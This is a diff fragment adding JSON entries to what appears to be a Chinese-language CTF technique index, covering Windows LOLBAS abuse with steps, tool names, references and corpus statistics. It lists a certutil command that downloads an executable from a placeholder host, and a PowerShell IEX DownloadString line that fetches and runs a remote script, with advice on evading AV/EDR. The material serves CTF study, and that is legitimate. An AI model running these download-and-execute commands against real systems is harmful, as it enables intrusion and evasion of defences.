+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "GTFOBins（GPL-3.0：只作索引查询，不拷数据进本仓库）",
+     "url": "https://gtfobins.github.io/"
+    }
+   ]
+  },
+  {
+   "id": "windows-lolbas",
+   "title": "Windows 白利用：LOLBAS 查系统自带二进制",
+   "phase": "method",
+   "tags": [
+    "priv_esc",
+    "windows"
+   ],
+   "signals": [
+    "Windows 环境不给上传工具",
+    "要下载/执行/绕防护但只能用系统自带",
+    "题目给的是 .bat/.ps1/.hta"
+   ],
+   "mechanism": "Windows 生态里有大量「系统自带但能用来下载、执行、绕过」的二进制（LOLBAS 项目按 OSBinaries/OtherMSBinaries/OSScripts/OSLibraries 分类，每条带 Name/Commands[Command,Description,Usecase,Category,Privileges,MitreID]）。枚举可用名称，再查它能做哪一类动作。",
+   "steps": [
+    "先确认能用哪些解释器（powershell.exe/certutil/mshta/rundll32…）",
+    "按需要的能力（下载/执行/编码）去 LOLBAS 查对应 Category",
+    "把命令替换成回连/落地的地址再执行",
+    "注意 AV/EDR 对高频 LOLBin 的监控"
+   ],
+   "cmds": [
+    "certutil -urlcache -split -f http://HOST/a.exe a.exe",
+    "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://HOST/p.ps1')\"",
+    "# 查表：LOLBAS 仓库 yml/OSBinaries/*.yml"
+   ],
+   "tools": [
+    "LOLBAS",
+    "PowerShell"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "priv_esc",
+    "files": 350,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 204,
+     "balsn__ctf_writeup": 22,
+     "JorianWoltjer__practical-ctf": 29,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 29,
+     "p4-team__ctf": 14,
+     "ctf-wiki__ctf-wiki": 52
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md",
+     "Des-CTF-Knowledge-main/SQL.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "LOLBAS（GPL-3.0：只作索引查询）",
+     "url": "https://lolbas-project.github.io/"
     }
    ]
   }
